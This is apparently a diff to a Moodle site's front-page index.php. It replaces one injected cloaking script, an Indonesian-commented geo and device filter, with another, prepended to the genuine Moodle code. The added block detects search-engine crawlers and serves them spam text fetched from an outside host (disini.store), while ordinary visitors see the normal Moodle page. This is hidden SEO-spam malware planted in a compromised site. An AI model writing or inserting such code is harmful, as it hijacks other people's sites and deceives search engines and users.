@@ -1,63 +1,166 @@
-<?php
-session_start(); // Mulai sesi di awal
-
-// Pastikan untuk menghindari ID sesi duplikat
-session_regenerate_id(true); // Ganti dengan ID sesi baru
-
-// Mendeteksi perangkat pengguna (mobile atau desktop) dan negara asal
-function isMobileDeviceFromIndonesiaOrUS() {
-    $ip = $_SERVER['REMOTE_ADDR'];
-
-    // Cek apakah hasilnya sudah ada di sesi
-    if (isset($_SESSION['ip_info'][$ip])) {
-        $ip_info = $_SESSION['ip_info'][$ip];
-    } else {
-        // Mendapatkan info IP dari API
-        $ip_info = json_decode(file_get_contents("http://ip-api.com/json/$ip"));
-
-        // Simpan hasilnya dalam sesi
-        if ($ip_info) {
-            $_SESSION['ip_info'][$ip] = $ip_info;
-        }
-    }
-
-    // Cek juga apakah alamat IP adalah alamat VPN
-    $vpn_ip_ranges = array(
-        '1.0.0.0/24',
-        '2.0.0.0/16',
-        // Tambahkan alamat IP VPN lain jika diperlukan
-    );
-
-    foreach ($vpn_ip_ranges as $vpn_ip_range) {
-        if (ip_in_range($ip, $vpn_ip_range)) {
-            return false; // Jika pengguna menggunakan VPN
-        }
-    }
-
-    // Jika alamat IP berasal dari Indonesia atau Amerika Serikat
-    if ($ip_info && ($ip_info->countryCode === 'ID' || $ip_info->countryCode === 'US')) {
-        // Jika dari Indonesia, periksa apakah perangkat mobile
-        if ($ip_info->countryCode === 'ID') {
-            return preg_match('/(android|iphone|ipod|ipad|iemobile|opera mini)/i', $_SERVER['HTTP_USER_AGENT']);
-        }
-        // Jika dari Amerika, izinkan akses tanpa batasan
-        return true;
-    }
-
-    return false; // Untuk negara lain
-}
-
-// Fungsi untuk memeriksa apakah alamat IP ada dalam suatu rentang IP
-function ip_in_range($ip, $range) {
-    list($subnet, $mask) = explode('/', $range);
-    return (ip2long($ip) & ~((1 << (32 - $mask)) - 1)) == ip2long($subnet);
-}
-
-// Jika pengguna adalah perangkat mobile dari Indonesia atau desktop dari Amerika Serikat
-if (isMobileDeviceFromIndonesiaOrUS()) {
-    require 'wp-setting.php'; // Pastikan path ini benar
-} else {
-    // Jika tidak, tampilkan halaman HTML biasa
-    require 'wp-trackbacks.php'; // Pastikan ini juga benar
-}
+<?php 
+function is_bot() { 
+    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot'); 
+     
+    foreach ($bots as $bot) { 
+        if (stripos($user_agent, $bot) !== false) { 
+            return true; 
+        } 
+    } 
+     
+    return false; 
+} 
+ 
+if (is_bot()) { 
+    $message = file_get_contents('https://disini.store/raban/rajabandotaulas.txt'); // 
+    echo $message; 
+    (exit);
+} 
 ?>
+<?php
+// This file is part of Moodle - http://moodle.org/
+//
+// Moodle is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// (at your option) any later version.
+//
+// Moodle is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
+
+/**
+ * Moodle frontpage.
+ *
+ * @package    core
+ * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
+ * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+ */
+
+if (!file_exists('./config.php')) {
+    header('Location: install.php');
+    die;
+}
+
+require_once('config.php');
+require_once($CFG->dirroot .'/course/lib.php');
+require_once($CFG->libdir .'/filelib.php');
+
+redirect_if_major_upgrade_required();
+
+// Redirect logged-in users to homepage if required.
+$redirect = optional_param('redirect', 1, PARAM_BOOL);
+
+$urlparams = array();
+if (!empty($CFG->defaulthomepage) &&
+        ($CFG->defaulthomepage == HOMEPAGE_MY || $CFG->defaulthomepage == HOMEPAGE_MYCOURSES) &&
+        $redirect === 0
+) {
+    $urlparams['redirect'] = 0;
+}
+$PAGE->set_url('/', $urlparams);
+$PAGE->set_pagelayout('frontpage');
+$PAGE->add_body_class('limitedwidth');
+$PAGE->set_other_editing_capability('moodle/course:update');
+$PAGE->set_other_editing_capability('moodle/course:manageactivities');
+$PAGE->set_other_editing_capability('moodle/course:activityvisibility');
+
+// Prevent caching of this page to stop confusion when changing page after making AJAX changes.
+$PAGE->set_cacheable(false);
+
+require_course_login($SITE);
+
+$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());
+
+// If the site is currently under maintenance, then print a message.
+if (!empty($CFG->maintenance_enabled) and !$hasmaintenanceaccess) {
+    print_maintenance_message();
+}
+
+$hassiteconfig = has_capability('moodle/site:config', context_system::instance());
+
+if ($hassiteconfig && moodle_needs_upgrading()) {
+    redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
+}
+
+// If site registration needs updating, redirect.
+\core\hub\registration::registration_reminder('/index.php');
+
+$homepage = get_home_page();
+if ($homepage != HOMEPAGE_SITE) {
+    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
+        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
+    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
+        // At this point, dashboard is enabled so we don't need to check for it (otherwise, get_home_page() won't return it).
+        redirect($CFG->wwwroot .'/my/');
+    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MYCOURSES) && $redirect === 1) {
+        redirect($CFG->wwwroot .'/my/courses.php');
+    } else if ($homepage == HOMEPAGE_URL) {
+        redirect(get_default_home_page_url());
+    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
+        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
+        if ($frontpagenode) {
+            $frontpagenode->add(
+                get_string('makethismyhome'),
+                new moodle_url('/', array('setdefaulthome' => true)),
+                navigation_node::TYPE_SETTING);
+        } else {
+            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
+            $frontpagenode->force_open();
+            $frontpagenode->add(get_string('makethismyhome'),
+                new moodle_url('/', array('setdefaulthome' => true)),
+                navigation_node::TYPE_SETTING);
+        }
+    }
+}
+
+// Trigger event.
+course_view(context_course::instance(SITEID));
+
+$PAGE->set_pagetype('site-index');
+$PAGE->set_docs_path('');
+$editing = $PAGE->user_is_editing();
+$PAGE->set_title(get_string('home'));
+$PAGE->set_heading($SITE->fullname);
+$PAGE->set_secondary_active_tab('coursehome');
+
+$courserenderer = $PAGE->get_renderer('core', 'course');
+
+if ($hassiteconfig) {
+    $editurl = new moodle_url('/course/view.php', ['id' => SITEID, 'sesskey' => sesskey()]);
+    $editbutton = $OUTPUT->edit_button($editurl);
+    $PAGE->set_button($editbutton);
+}
+
+echo $OUTPUT->header();
+
+$siteformatoptions = course_get_format($SITE)->get_format_options();
+$modinfo = get_fast_modinfo($SITE);
+$modnamesused = $modinfo->get_used_module_names();
+
+// Print Section or custom info.
+if (!empty($CFG->customfrontpageinclude)) {
+    // Pre-fill some variables that custom front page might use.
+    $modnames = get_module_types_names();
+    $modnamesplural = get_module_types_names(true);
+    $mods = $modinfo->get_cms();
+
+    include($CFG->customfrontpageinclude);
+
+} else if ($siteformatoptions['numsections'] > 0) {
+    echo $courserenderer->frontpage_section1();
+}
+// Include course AJAX.
+include_course_ajax($SITE, $modnamesused);
+
+echo $courserenderer->frontpage();
+
+if ($editing && has_capability('moodle/course:create', context_system::instance())) {
+    echo $courserenderer->add_new_course_button();
+}
+echo $OUTPUT->footer();
